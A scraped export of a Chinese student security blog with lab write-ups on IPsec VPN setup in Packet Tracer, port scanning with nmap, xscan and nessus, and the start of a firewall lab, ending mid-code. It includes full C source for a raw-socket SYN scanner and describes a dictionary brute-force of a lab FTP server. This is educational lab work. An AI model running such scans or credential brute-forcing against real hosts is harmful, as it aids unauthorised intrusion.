Prompt\n使用ping命令，ping 192.168.1.1、10.0.0.1、192.168.2.10、10.0.0.2、192.168.3.10结果除了最后一个地址(该地址不存在)其它全能ping通，表明搭建的网络满足实验环境\n0x05 IPSEC隧道模式VPN 5.1 配置IPSec VPN 配置router 0，双击router 0图标，选择CLI项，进入路由器配置窗口\n定义IKE的策略(router 0和router1之间的密钥交换策略)，IKE只是密钥的交换策略,在使用加密对称和非对称加密算法的时候,需要密钥来对数据加密,下面的IKE策略只是建立一条管理连接，负责加密生成的各种密钥，输入命令如下\n1 2 3 4 5 6 7 8 9 Router#configure terminal\t//进入配置状态，通过端口进行配置 Router (config)#crypto isakmp policy 10\t//一个IKE的策略，号码是10，数字越低，策略优先级越高 Router (config-isakmp)# authentication pre-share\t//使用预定义共享密钥进行设备认证 Router (config-isakmp)#hash md5\t//认证方式使用MD5进行认证 Router (config-isakmp)#encryption des\t//加密方式使用DES，可选AES/DES Router (config-isakmp)#group 2\t//指定DH组 Router (config-isakmp)# lifetime 86400\t//对生成新SA的周期进行调整，两端的路由器都要设置相同的SA周期 Router (config-isakmp)# exit Router (config)#crypto isakmp key reus09 address 10.0.0.2 //定义一个密码,密码是reus09，和地址为10.0.0.2的设备去交换密钥 定义数据的加密方式和认证方式，配置IPSec，输入命令如下\n1 2 3 4 5 6 7 8 Router (config)#access-list 110 permit ip 192.168.1.0 0.0.0.255 192.168.2.0 0.0.0.255\t//定义访问控制列表,这里的访问控制列表不是对数据进行过滤，是定义那些数据应该被加密，也可以理解哪些数据触发IPSec 流 Router (config)#crypto ipsec transform-set mine esp-des esp-md5-hmac\t//设置数据的加密方式，策略名字为mine，使用ESP-DES对数据加密，ESP-MD5-HMAC对数据认证 Router(config)# crypto map mymap 101 ipsec-isakmp //定义一个map,调用刚才做的策略 Router(config-crypto-map)# match address 110\t//匹配出访问控制列表110的数据 Router(config-crypto-map)# set peer 10.0.0.2 //标识对端路由器的合法IP地址 Router(config-crypto-map)# set pfs group2 Router(config-crypto-map)# set transform-set mine //使用刚才定义好的策略对数据加密 Router(config-crypto-map)# set security-association lifetime seconds 86400\t//指定IPSec SA的存活期 将map映射到公网端口，一个端口只能映射一个map，输入命令如下\n1 2 3 4 Router（config）interface fastEthernet 0/0 Router(config-if)#crypto map mymap *Jan 3 07:16:26.785: %CRYPTO-6-ISAKMP_ON_OFF: ISAKMP is ON Router（config-if）end 查看策略\n查看IKE策略\n1 Router# show crypto isakmp policy 查看IPSec变换集\n1 Router# show crypto ipsec transform-set 查看 crypto maps\n1 Router# show crypto map 配置router 1，双击router 1图标，选择CLI项，进入路由器配置窗口\n定义IKE的策略，与配置route 0相同 定义数据的加密方式和认证方式，配置IPSec，与配置route 0相同 将map映射到公网端口，与配置route 0相同 5.2 测试IPSec VPN 测试VPN连通性\n双击PC0图标，在弹出的对话框中，选择Desktop，选择Command Prompt，ping 192.168.2.10，如下图所示\n验证数据经过IPSec VPN 加密传输，点击进入simulation mode，弹出如图所示对话框\n重复上一步操作，simulation Panel中选取Auto Capture，观察工作区动画，展示了数据包在网络中的传送过程\n双击路由器router 0处数据包，弹出如图所示弹框，可以分析出数据包的信息\n进入路由器的数据包（左侧）的信息源IP是192.168.1.10，目的IP是192.168.2.10 路由器出去的数据包(右侧)的源IP改变为10.0.0.1，目的IP变为10.0.0.2 从上图的第六条信息中发现ESP encrypts the received packet的信息 综上，从PC0（192.168.1.10）发往对端PC3（192.168.2.10）的数据经过了路由器的IPSec VPN模块加密处理，隐藏了内网的IP地址信息，从而保护了内网的数据 断开VPN\n断开router 0\n1 2 3 Router（config）#interface fastEthernet 0/0 Router(config-if)#no crypto map mymap Router（config-if）end 双击PC0图标，在弹出的对话框中，选择Desktop，选择Command Prompt，ping 192.168.2.10，ping不通，表明只断开一端路由器的端口map映射，两边无法连通\n以同样的方式断开route 1\n1 2 3 Router（config）#interface fastEthernet 0/0 Router(config-if)#no crypto map mymap Router（config-if）end 双击PC0图标，在弹出的对话框中，选择Desktop，选择Command Prompt，ping 192.168.2.10，ping成功，表明两端都断开后，两边网络可以再次保持连接\n抓取经过route 0的数据包，发现数据不再加密传输。\n0x06 总结 通过配置IPSEC，明白AH和ESP的区别。 配置OPEN VPN,PacketTrace 对局域网的架构有了一定的了解。 配置多个VPN，明白了VPN的工作原理。 ","permalink":"http://www.reus09.top/posts/tech/vpn%E9%85%8D%E7%BD%AE/","summary":"VPN配置实验 0x01 实验内容 在Windows IPSEC配置实验中，通过抓包工具抓取IKE SA和IPSEC SA建立过程的数据包，并进行分析；思考：","title":"Vpn配置"},{"content":"网络扫描 0x01 实验目的 用xscan、nmap和nessus软件进行主机、端口、漏洞扫描实验，捕获扫描时交互的数据包，通过分析扫描数据包，验证扫描原理。 找到一种常见的主机系统或应用程序漏洞，研究该漏洞的扫描原理，对该漏洞进行扫描器扫描实验，通过分析捕获的扫描数据包验证漏洞扫描原理。(选做) 编程实现TCP全连接或半连接的端口扫描。（选做） 0x02 实验前提知识 网络扫描器的主要功能\n扫描目标主机识别其工作状态（开/关机） 识别目标主机端口的状态（监听/关闭） 识别目标主机系统及服务程序的类型和版本 根据已知漏洞信息，分析系统脆弱点 生成扫描结果报告 扫描器的基本工作原理\n网络扫描技术\n主机扫描技术\n主机扫描的目的是确定在目标网络上的主机是否可达。这是信息收集的初级阶段，其效果直接影响到后续的扫描。 传统扫描手段 ICMP Echo扫描 ICMP Sweep扫描 Broadcast ICMP扫描 Non-Echo ICMP扫描 防火墙和网络过滤设备常常导致传统的探测手段变得无效。为了突破这种限制，必须采用一些非常规的手段，利用ICMP协议提供网络间传送错误信息的手段，往往可以更有效的达到目的： 异常的IP包头 在IP头中设置无效的字段值 错误的数据分片 通过超长包探测内部路由器 反向映射探测 端口扫描技术\n确定目标主机可达后，使用端口扫描技术，发现目标主机的开放端口，包括网络协议和各种应用监听的端口。\n开放扫描 会产生大量的审计数据，容易被对方发现，但其可靠性高\nTCP Connect 扫描 TCP反向ident扫描 隐蔽扫描\n能有效的避免对方入侵检测系统和防火墙的检测，但这种扫描使用的数据包在通过网络时容易被丢弃从而产生错误的探测信息\nTCP FIN 扫描 TCP Xmas扫描 TCP Null 扫描 TCP ftp proxy扫描 分段扫描 半开放扫描\n隐蔽性和可靠性介于前两者之间。\nTCP SYN 扫描 TCP间接扫描 UDP端口扫描\n栈指纹OS识别技术\n根据各个OS在TCP/IP协议栈实现上的不同特点，采用黑盒测试方法，通过研究其对各种探测的响应形成识别指纹，进而识别目标主机运行的操作系统 被动扫描 通过Sniffer收集数据包，再对数据包的不同特征（TCP Window\u0002size、 IP TTL、IP TOS、DF位等参数）进行分析，来识别操作系统。 主动扫描 采用向目标系统发送构造的特殊包并监控其应答的方式来识别操作系统类型。 漏洞扫描技术\n在端口扫描后得知目标主机开启的端口以及端口上的网络服务，将这些相关信息与网络漏洞扫描系统提供的漏洞库进行匹配，查看是否有满足匹配条件的漏洞存在。 通过模拟黑客的攻击手法，对目标主机系统进行攻击性的安全漏洞扫描，如测试弱势口令等。若模拟攻击成功，则表明目标主机系统存在安全漏洞。 CGI漏洞扫描、POP3漏洞扫描、FTP漏洞扫描、SSH漏洞扫描、HTTP漏洞扫描等。这些漏洞扫描是基于漏洞库，将扫描结果与漏洞库相关数据匹配比较得到漏洞信息。 Unicode遍历目录漏洞探测、FTP 弱密码探测、OPENRelay邮件转发漏洞探测等，这些扫描通过使用插件（功能模块技术）进行模拟攻击，测试出目标主机的漏洞信息。 0x03 实验环境 Winodows xp 汇编 IP:192.168.195.135 MAC: 00-0c-29-19-ba-6e Winodows xp 网络安全实验 IP:192.168.195.131 MAC:00-0c-29-06-65-c9 Windows 7 IP:192.168.195.145 MAC:00-0c-29-f1-b5-17 程序运行机器 Ubuntu 16 网关 IP : 192.168.195.2 MAC : 00-50-56-e7-d4-22 工具 xscan nmap nessus wireshark 0x04 软件扫描 xscan xscan 配置 参数\n开始扫描\n扫描结果 Wireshark抓包分析\n首先应该是 SYN半扫描端口是否开放\n源IP(192.168.195.131)随机端口发送tcp-syn连接给目的IP(1921.68.195.135)\n因为扫描了1024个端口，这里只放第一个和最后一个端口的截图\nSYN扫描实现原理：扫描器向目标主机端口发送SYN包。如果应答是RST包，那么说明端口是关闭的；如果应答中包含SYN和ACK包，说明目标端口处于监听状态，再传送一个RST包给目标机从而停止建立连接。\n可以看到大量的tcp-syn请求，返回的均为RST,标明该端口没有开放\n如果返回为SYN+ACK,则表明端口开放\nTCP Connect 扫描\n实现原理：通过调用socket函数connect()连接到目标计算机上，完成一次完整的三次握手过程。如果端口处于侦听状态，那么connect()就能成功返回。否则，这个端口不可用，即没有提供服务。 通过三次握手，查看端口是否开放，并进行一定的使用 ftps ssh http https sslv2协议试探\nUDP端口扫描\n向目标端口发送UDP 包。如果得到的应答为“ICMP port Unreachable”（ICMP 端口不可到达），那么目标端口是关闭的。 反之，如果没有收到这个应答消息，则目标端口极有可能是开放的。 结合报告，xscan主要对netbios-ssn(139/tcp)、https (443/tcp)、FTP-ssl (990/tcp)、ssh (22/tcp)、www (443/tcp)、ftp (990/tcp)、microsoft-ds (445/tcp)、ftp (21/tcp)、epmap (135/tcp)、www (80/tcp)、netbios-ns (137/udp)、ntp (123/udp)\nnmap 参数设置\n首先开启的为 TCP SYN扫描\nTCP - SYN扫描\n扫描器向目标主机端口发送FIN包。当一个FIN数据包到达一个关闭的端口，数据包会被丢掉，并且返回一个RST数据包。否则，若是打开的端口，数据包只是简单的丢掉（不返回RST）。 Wireshark抓包\n、 发现无效，因为TCP SYN扫描通常适用于UNIX目标主机，但在Windows95/NT环境下，该方法无效。因为不论目标端口是否打开，操作系统都返回RST包。我们这里的目标主机是xp系统，所以无论什么端口都会回显RST包 开启 TCP ACK 扫描\nTCP-ACK扫描 TCP ACK扫描是利用标志位ACK，而ACK标志在TCP协议中表示确认序号有效，它表示确认一个正常的TCP连接。但是在TCP ACK扫描中没有进行正常的TCP连接过程，实际上是没有真正的TCP连接。那么当发送一个带有ACK标志的TCP报文到目标主机的端口时，目标主机会怎样反应呢？ 使用TCP ACK扫描不能够确定端口的关闭或者开放，因为当发送给对方一个含有ACK表示的TCP报文的时候，都返回含有RST标志的报文，无论端口是开放或者关闭。所以，不能使用TCP ACK扫描来确定端口是否开放或者关闭。但是可以利用它来扫描防火墙的配置，用它来发现防火墙规则，确定它们是有状态的还是无状态的，哪些端口是被过滤的 Wireshark抓包 可以看到源主机发送的TCP请求包中，ACK直接被初始化了，没有了SYN过程 开启TCP - Xmas 扫描\nTCP - Xmas 扫描 TCP Xmas和Null扫描是FIN扫描的两个变种。Xmas扫描打开FIN，URG和PUSH标记，而Null扫描关闭所有标记。 这些组合的目的是为了通过对FIN标记数据包的过滤。 当此类数据包到达一个关闭的端口，数据包会被丢掉，并且返回一个RST数据包。否则，若是打开的端口，数据包只是简单的丢掉（不返回RST）。 Wireshak 抓包 可以看到发的源IP包里面带有Urgent、Fin、Push字段 TCP - Connect 扫描\n通过调用socket函数connect()连接到目标计算机上，完成一次完整的三次握手过程。如果端口处于侦听状态，那么connect()就能成功返回。否则，这个端口不可用，即没有提供服务\nWireshark 抓包\n可以看到我们开放的http端口经过TCP三次连接可以连接，而另一个端口无法连接，返回一个RST包\n开启 TCP NULL 扫描\nTCP NULL 扫描 TCP Xmas和Null扫描是FIN扫描的两个变种。而Null扫描关闭所有标记。这些组合的目的是为了通过对FIN标记数据包的过滤。当此类数据包到达一个关闭的端口，数据包会被丢掉，并且返回一个RST数据包。否则，若是打开的端口，数据包只是简单的丢掉（不返回RST）。 可以看到我们开放的端口都没有回显，关闭的端口都返回一个RST、ACK包 开启 TCP 滑动窗口扫描\n其实就是大量的TCP ACK扫描\n根据抓包，发现其即为通过同时发送大量的ACK包，这里是TCP ACK扫描\n同时大量返回对上述包的RST包来查看端口是否开放。\nTCP FIN 扫描\nTCP FIN 扫描 扫描器向目标主机端口发送FIN包。当一个FIN数据包到达一个关闭的端口，数据包会被丢掉，并且返回一个RST数据包。否则，若是打开的端口，数据包只是简单的丢掉（不返回RST）。 Wireshark分析 通过将请求包置为FIN查看端口是否开放。 nmap报告\nnessus 因为Window xp里面的 nessus版本用不了\n所以在虚拟机Windows 7 里面搭建新版的 Nessus 8\n并且对靶机192.168.195.135进行攻击\n利用Wireshark进行抓包分析数据流。\nTCP-SYN扫描\n这里仅以HTTP为例子。(其他的协议就不赘述了)\n80端口开放，所以SYN请求之后，可以正常回显，反之，如果请求的端口81.82没有开放，则回显一个RST包\nTCP - Connect 扫描\n可以看到 交互过程先 实现三次握手。查看了HTTPS、HTTP、TLSV1、ssh、FTP协议 SSLV2 协议是否支持\nSSLv3 协议是否支持\nnessus 扫描192.168.195.135 得到的漏洞报告\n0x05 找到漏洞 FTP弱口令漏洞扫描： 扫描原理： 在上述实验过程中，发现靶机开启了21(默认端口)，那么我们可以用字典里的账户和密码去试着登录，如果能够登陆上去，则存在漏洞 利用S-scan进行扫描模块 选择扫描模块，扫描端口 扫描结束 生成的报告 用Wireshark 对过程进行分析 首先，攻击机利用随机端口向靶机的FTP端口发出TCP SYN连接请求 然后，靶机端给其回复一个ACK,此时可以监听到21端口 最后，攻击机收到靶机的ack，再回复一个ack,至此三次握手完成 之后，攻击机就开始用字典里面的数据来 不断发送数据包来暴力破解 靶机的FTP服务器密码账户 之后的过程，攻击机一直再重复以上过程，但可能因为FTP账户和密码设置的较为复杂，以及攻击机的字典过于弱小，所以不能够暴力登入ftp服务器中 0x06 编程实现 这里实现的是TCP SYN 扫描(即半连接扫描)\n这里用套接字socket的方法来实现tcp SYN 扫描\n来实现查看靶机端口的开放情况，便于方便，这里端口即从1~1024为止。 只需要构造好一个TCP包，指定好包中IP.flags=0x02(为SYN包)。\n我们这里在ubuntu 16 的环境中编译我们写好的程序\n执行程序\n与此同时，利用Wireshark在靶机进行抓包\n可以很明显的看到攻击机的随机端口向靶机的端口从1-1024发送SYN请求，端口存在返回ACK包，端口不存在返回RST包。 源码\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 95 96 97 98 99 100 101 102 103 104 105 106 107 108 109 110 111 112 113 114 115 116 117 118 119 120 121 122 123 124 125 126 127 128 129 130 131 132 133 134 135 136 137 138 139 140 141 142 143 144 145 146 147 148 149 150 151 152 153 154 155 156 157 158 159 160 161 162 163 164 165 166 167 168 169 170 171 172 173 174 175 176 177 178 179 180 181 182 183 184 185 186 187 188 189 190 191 192 193 194 195 196 197 198 199 200 201 202 203 204 205 206 207 208 209 210 211 212 213 214 215 216 217 218 219 220 #include \u0026lt;stdio.h\u0026gt; #include \u0026lt;ctype.h\u0026gt; #include \u0026lt;unistd.h\u0026gt; #include \u0026lt;fcntl.h\u0026gt; #include \u0026lt;signal.h\u0026gt; #include \u0026lt;sys/time.h\u0026gt; #include \u0026lt;sys/types.h\u0026gt; #include \u0026lt;sys/socket.h\u0026gt; #include \u0026lt;string.h\u0026gt; #include \u0026lt;netdb.h\u0026gt; #include \u0026lt;errno.h\u0026gt; #include \u0026lt;stdlib.h\u0026gt; #include \u0026lt;time.h\u0026gt; #include \u0026lt;arpa/inet.h\u0026gt; struct iphdr { unsigned char ver_and_hdrlen;// 版本号与IP头部长度 unsigned char tos; // 服务类型 unsigned short total_len; // 总长度 unsigned short id; // IP包ID unsigned short flags; // 标志位(包括分片偏移量) unsigned char ttl; // 生命周期 unsigned char protocol; // 上层协议 unsigned short checksum; // 校验和 unsigned int srcaddr; // 源IP地址 unsigned int dstaddr; // 目标IP地址 }; struct tcphdr { unsigned short sport; // 源端口 unsigned short dport; // 目标端口 unsigned int seq; // 序列号 unsigned int ack_seq; // 确认号 unsigned char len; // 首部长度 unsigned char flag; // 标志位 unsigned short win; // 窗口大小 unsigned short checksum; // 校验和 unsigned short urg; // 紧急指针 }; struct pseudohdr { unsigned int saddr; unsigned int daddr; char zeros; char protocol; unsigned short length; }; unsigned short inline checksum(unsigned short *buffer, unsigned short size) { unsigned long cksum = 0; while (size \u0026gt; 1) { cksum += *buffer++; size -= sizeof(unsigned short); } if (size) { cksum += *(unsigned char *)buffer; } cksum = (cksum \u0026gt;\u0026gt; 16) + (cksum \u0026amp; 0xffff); cksum += (cksum \u0026gt;\u0026gt; 16); return (unsigned short )(~cksum); } void init_ip_header(struct iphdr *ip, unsigned int srcaddr, unsigned int dstaddr) { int len = sizeof(struct iphdr) + sizeof(struct tcphdr); ip-\u0026gt;ver_and_hdrlen = (4\u0026lt;\u0026lt;4 | sizeof(struct iphdr)/sizeof(unsigned int)); ip-\u0026gt;tos = 0; ip-\u0026gt;total_len = htons(len); ip-\u0026gt;id = 1; ip-\u0026gt;flags = 0x40; ip-\u0026gt;ttl = 255; ip-\u0026gt;protocol = IPPROTO_TCP; ip-\u0026gt;checksum = 0; ip-\u0026gt;srcaddr = srcaddr; // 源IP地址 ip-\u0026gt;dstaddr = dstaddr; // 目标IP地址 } void init_tcp_header(struct tcphdr *tcp, unsigned short dport) { tcp-\u0026gt;sport = htons(rand() % 16383 + 49152); // 随机生成一个端口 tcp-\u0026gt;dport = htons(dport); // 目标端口 tcp-\u0026gt;seq = htonl(rand() % 90000000 + 2345 ); // 随机生成一个初始化序列号 tcp-\u0026gt;ack_seq = 0; tcp-\u0026gt;len = (sizeof(struct tcphdr) / 4 \u0026lt;\u0026lt; 4 | 0); tcp-\u0026gt;flag = 0x02; tcp-\u0026gt;win = htons(1024); tcp-\u0026gt;checksum = 0; tcp-\u0026gt;urg = 0; } void init_pseudo_header(struct pseudohdr *pseudo, unsigned int srcaddr, unsigned int dstaddr) { pseudo-\u0026gt;zeros = 0; pseudo-\u0026gt;protocol = IPPROTO_TCP; pseudo-\u0026gt;length = htons(sizeof(struct tcphdr)); pseudo-\u0026gt;saddr = srcaddr; pseudo-\u0026gt;daddr = dstaddr; } int make_syn_packet(char *packet, int pkt_len, unsigned int daddr,unsigned int saddr, unsigned short dport) { char buf[100]; int len; struct iphdr ip; //IP 头部 struct tcphdr tcp; //TCP 头部 struct pseudohdr pseudo; //TCP 伪头部 //saddr = inet_addr(\u0026#34;192.168.195.145\u0026#34;); len = sizeof(ip) + sizeof(tcp); // 初始化头部信息 init_ip_header(\u0026amp;ip, saddr, daddr); init_tcp_header(\u0026amp;tcp, dport); init_pseudo_header(\u0026amp;pseudo, saddr, daddr); //计算IP校验和 ip.checksum = checksum((u_short *)\u0026amp;ip, sizeof(ip)); // 计算TCP校验和 bzero(buf, sizeof(buf)); memcpy(buf , \u0026amp;pseudo, sizeof(pseudo)); // 复制TCP伪头部 memcpy(buf + sizeof(pseudo), \u0026amp;tcp, sizeof(tcp)); // 复制TCP头部 tcp.checksum = checksum((u_short *)buf, sizeof(pseudo) + sizeof(tcp)); bzero(packet, pkt_len); memcpy(packet, \u0026amp;ip, sizeof(ip)); memcpy(packet + sizeof(ip), \u0026amp;tcp, sizeof(tcp)); return len; } int make_raw_socket() { int fd; int on = 1; // 创建一个原始套接字, 指定其关注TCP协议 fd = socket(AF_INET, SOCK_RAW, IPPROTO_TCP); if (fd == -1) { return -1; } // 设置需要手动构建IP头部 if (setsockopt(fd, IPPROTO_IP, IP_HDRINCL, (char *)\u0026amp;on, sizeof(on)) \u0026lt; 0) { close(fd); return -1; } return fd; } int send_syn_packet(int i ,int sockfd, unsigned int addr, unsigned int sddr,unsigned short port) { struct sockaddr_in skaddr; char packet[256]; int pkt_len; bzero(\u0026amp;skaddr, sizeof(skaddr)); skaddr.sin_family = AF_INET; skaddr.sin_port = htons(port); skaddr.sin_addr.s_addr = addr; printf(\u0026#34;%d 端口已经探测\\n\u0026#34;,i); pkt_len = make_syn_packet(packet, 256, addr,sddr, port); return sendto(sockfd, packet, pkt_len, 0, (struct sockaddr *)\u0026amp;skaddr, sizeof(struct sockaddr)); } int main(int argc, char *argv[]) { unsigned int addr; unsigned int sddr; unsigned short port; int sockfd; if (argc \u0026lt; 3) { fprintf(stderr, \u0026#34;Usage: synflood \u0026lt;address\u0026gt; \u0026lt;port\u0026gt;\\n\u0026#34;); exit(1); } addr = inet_addr(argv[1]); sddr = inet_addr(argv[2]); sockfd = make_raw_socket(); if (sockfd == -1) { fprintf(stderr, \u0026#34;Failed to make raw socket\\n\u0026#34;); exit(1); } for (int i = 0 ; i \u0026lt;= 1024; i++) { port = i; if (send_syn_packet(i,sockfd, addr,sddr, port) \u0026lt; 0) { fprintf(stderr, \u0026#34;Failed to send syn packet\\n\u0026#34;); } i +=1; } close(sockfd); return 0; } 0x07 总结 明晓网络扫描器xscan、nmap、nessus网络扫描过程中用到的扫描方法。 网络扫描三个过程 主机扫描 端口扫描 漏洞分析 明白了TCP SYN、ACK、FIN、NULL、Xmac、Connect 等扫描方法的原理。 通过Xscan扫描靶机的FTP,通过Wireshark抓包分析扫描器利用FTP弱口令漏洞的过程。 通过编程socket 实现 TCP SYN 扫描，进一步加深了对socket编程的理解。 ","permalink":"http://www.reus09.top/posts/tech/%E7%BD%91%E7%BB%9C%E6%89%AB%E6%8F%8F/","summary":"网络扫描 0x01 实验目的 用xscan、nmap和nessus软件进行主机、端口、漏洞扫描实验，捕获扫描时交互的数据包，通过分析扫描数据包，验证扫描","title":"网络扫描"},{"content":"防火墙实验 0x01 实验目标 选择一种主流的软件防火墙，熟悉其安全规则配置，通过配置防火墙规则，实现以下功能：\n过滤远程服务器（R）到本地主机（L）的TCP数据。 过滤R-\u0026gt;L中数据包源端口为21或80的数据，查看现象。 能够由本机登录ftp服务器成功（通过用户名、密码验证） 阻止将ftp内容列表、上传、下载数据。 配置linux系统下iptables防火墙；在linux系统下，配置iptables防火墙，实现如下功能：\nIptables防火墙的启动停止。 Iptables防火墙规则查看、添加、删除。 设置Iptables防火墙的包过滤规则，实现以下功能： 禁止所有进出本地主机的数据包通过；（通过Ping验证） 允许某特定IP主机远程ping本地主机； 允许某特定IP主机远程telnet或putty本地主机。 选做：完成下述功能：\n由本机登录ftp服务器成功（通过用户名、密码验证）； 无法将ftp内容列表或上传、下载数据； 0x02 实验前提 实验前提知识\n防火墙定义：\n防火墙是位于两个（或多个）网络间，实施网间访问控制的一组组件的集合。 防火墙是指隔离在内部网络和外部网络之间的一道防御系统，是这一类防范措施的总称。 防火墙设计目标：\n内部和外部之间的所有网络数据流必须经过防火墙。 只有符合安全策略的数据流，即，经过授权的数据流才能通过防火墙。 防火墙自身不能被攻破。 防火墙经典部署\n防火墙功能模块\n防火墙类型\n包过滤防火墙 包过滤防火墙用规则检测每个IP包，根据结果放行或丢弃这些数据包。 包过滤防火墙一般会配置为双向过滤，即针对进入内部网络和离开内部网络两个方向的数据进行过滤。 过滤规则基于数据包中的信息，例如： 源、目IP地址， 源、目端口，例如：FTP(21)、 HTTP(80) 、DNS(53)… 协议类型，例如：TCP、 UDP、 ICMP 、IGMP… 状态检查防火墙 过滤规则基于数据包中的信息，例如： 网络接口，例如：eth0用于入站，eth1用于出站… IP选项，例如：源路由、记录路由… TCP选项，例如：SYN 、ACK、 FIN 、RST… 数据包流向，例如：入站（in）或出站（out） 电路级代理防火墙 是一个通用代理服务器，它工作于OSI互联模型的会话层或是TCP/IP协议的TCP层。 它适用于多个协议，但它不能识别在同一个协议栈上运行的不同的应用，当然也就不需要对不同的应用设置不同的代理模块，但这种代理需要对客户端作适当修改。 它接受客户端的连接请求，代理客户端完成网络连接，建立起一个回路，对数据包起转发作用，数据包被提交给用户的应用层来处理。 通过电路级网关传递的数据似乎起源于防火墙，隐藏了被保护网络的信息。 应用层代理防火墙 首先，它对该用户的身份进行验证。 若为合法用户，则把请求转发给真正的某个内部网络的主机，同时监控用户的操作，拒绝不合法的访问。 当内部网络向外部网络申请服务时，代理服务器的工作过程刚好相反。 实验环境\nFTP服务器 windows xp IP:192.168.195.162 FTP客户端 以及 Windows防火墙 Windows xp IP:192.168.195.131 Linux 防火墙 Centos 7: 192.168.195.174 实验工具\n发送tcp包到目的机随机端口的脚本\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 95 96 97 98 99 100 101 102 103 104 105 106 107 108 109 110 111 112 113 114 115 116 117 118 119 120 121 122 123 124 125 126 127 128 129 130 131 132 133 134 135 136 137 138 139 140 141 142 143 144 145 146 147 148 149 150 151 152 153 154 155 156 157 158 159 160 161 162 163 164 165 166 167 168 169 170 171 172 173 174 175 176 177 178 179 180 181 182 183 184 185 186 187 188 189 190 191 192 193 194 195 196 197 198 199 200 201 202 203 204 205 206 207 208 209 210 211 212 213 214 215 216 217 218 219 220 #include \u0026lt;stdio.h\u0026gt; #include \u0026lt;ctype.h\u0026gt; #include \u0026lt;unistd.h\u0026gt; #include \u0026lt;fcntl.h\u0026gt; #include \u0026lt;signal.h\u0026gt; #include \u0026lt;sys/time.h\u0026gt; #include \u0026lt;sys/types.h\u0026gt; #include \u0026lt;sys/socket.h\u0026gt; #include \u0026lt;string.h\u0026gt; #include \u0026lt;netdb.h\u0026gt; #include \u0026lt;errno.h\u0026gt; #include \u0026lt;stdlib.h\u0026gt; #include \u0026lt;time.h\u0026gt; #include \u0026lt;arpa/inet.h\u0026gt; struct iphdr { unsigned char ver_and_hdrlen;// 版本号与IP头部长度 unsigned char tos; // 服务类型 unsigned short total_len; // 总长度 unsigned short id; // IP包ID unsigned short flags; // 标志位(包括分片偏移量) unsigned char ttl; // 生命周期 unsigned char protocol; // 上层协议 unsigned short checksum; // 校验和 unsigned int srcaddr; // 源IP地址 unsigned int dstaddr; // 目标IP地址 }; struct tcphdr { unsigned short sport; // 源端口 unsigned short dport; // 目标端口 unsigned int seq; // 序列号 unsigned int ack_seq; // 确认号 unsigned char len; // 首部长度 unsigned char flag; // 标志位 unsigned short win; // 窗口大小 unsigned short checksum; // 校验和 unsigned short urg; // 紧急指针 }; struct pseudohdr { unsigned int saddr; unsigned int daddr; char zeros; char protocol; unsigned short length; }; unsigned short inline checksum(unsigned short *buffer, unsigned short size) { unsigned long cksum = 0; while (size \u0026gt; 1) { cksum += *buffer++; size -= sizeof(unsigned short); } if (size) { cksum += *(unsigned char *)buffer; } cksum = (cksum \u0026gt;\u0026gt; 16) + (cksum \u0026amp; 0xffff); cksum += (cksum \u0026gt;\u0026gt; 16); return (unsigned short )(~cksum); } void init_ip_header(struct iphdr *ip, unsigned int srcaddr, unsigned int dstaddr) { int len = sizeof(struct iphdr) + sizeof(struct tcphdr); ip-\u0026gt;ver_and_hdrlen = (4\u0026lt;\u0026lt;4 | sizeof(struct iphdr)/sizeof(unsigned int)); ip-\u0026gt;tos = 0; ip-\u0026gt;total_len = htons(len); ip-\u0026gt;id = 1; ip-\u0026gt;flags = 0x40; ip-\u0026gt;ttl = 255; ip-\u0026gt;protocol = IPPROTO_TCP; ip-\u0026gt;checksum = 0; ip-\u0026gt;srcaddr = srcaddr; // 源IP地址 ip-\u0026gt;dstaddr = dstaddr; // 目标IP地址 } void init_tcp_header(struct tcphdr *tcp, unsigned short dport) { tcp-\u0026gt;sport = htons(rand() % 16383 + 49152); // 随机生成一个端口 tcp-\u0026gt;dport = htons(dport); // 目标端口 tcp-\u0026gt;seq = htonl(rand() % 90000000 + 2345 ); // 随机生成一个初始化序列号 tcp-\u0026gt;ack_seq = 0; tcp-\u0026gt;len = (sizeof(struct tcphdr) / 4 \u0026lt;\u0026lt; 4 | 0); tcp-\u0026gt;flag = 0x02; tcp-\u0026gt;win = htons(1024); tcp-\u0026gt;checksum = 0; tcp-\u0026gt;urg = 0; } void init_pseudo_header(struct pseudohdr *pseudo, unsigned int srcaddr, unsigned int dstaddr) { pseudo-\u0026gt;zeros = 0; pseudo-\u0026gt;protocol = IPPROTO_TCP; pseudo-\u0026gt;length = htons(sizeof(struct tcphdr)); pseudo-\u0026gt;saddr = srcaddr; pseudo-\u0026gt;daddr = dstaddr; } int make_syn_packet(char *packet, int pkt_len, unsigned int daddr,unsigned int saddr, unsigned short dport) { char buf[100]; int len; struct iphdr ip; //IP 头部 struct tcphdr tcp; //TCP 头部 struct pseudohdr pseudo; //TCP 伪头部 //saddr = inet_addr(\u0026#34;192.168.195.145\u0026#34;); len = sizeof(ip) + sizeof(tcp); // 初始化头部信息 init_ip_header(\u0026amp;ip, saddr, daddr); init_tcp_header(\u0026amp;tcp, dport); init_pseudo_header(\u0026amp;pseudo, saddr, daddr); //计算IP校验和 ip.checksum = checksum((u_short *)\u0026amp;ip, sizeof(ip)); // 计算TCP校验和 bzero(buf, sizeof(buf)); memcpy(buf , \u0026amp;pseudo, sizeof(pseudo)); // 复制TCP伪头部 memcpy(buf + sizeof(pseudo), \u0026amp;tcp, sizeof(tcp)); // 复制TCP头部 tcp.checksum = checksum((u_short *)buf, sizeof(pseudo) + sizeof(tcp)); bzero(packet, pkt_len); memcpy(packet, \u0026amp;ip, sizeof(ip)); memcpy(packet + sizeof(ip), \u0026amp;tcp, sizeof(tcp)); return len; } int make_raw_socket() { int fd; int on = 1; // 创建一个原始套接字, 指定其关注TCP协议 fd = socket(AF_INET, SOCK_RAW, IPPROTO_TCP); if (fd == -1) { return -1; } // 设置需要手动构建IP头部 if (setsockopt(fd, IPPROTO_IP, IP_HDRINCL, (char *)\u0026amp;on, 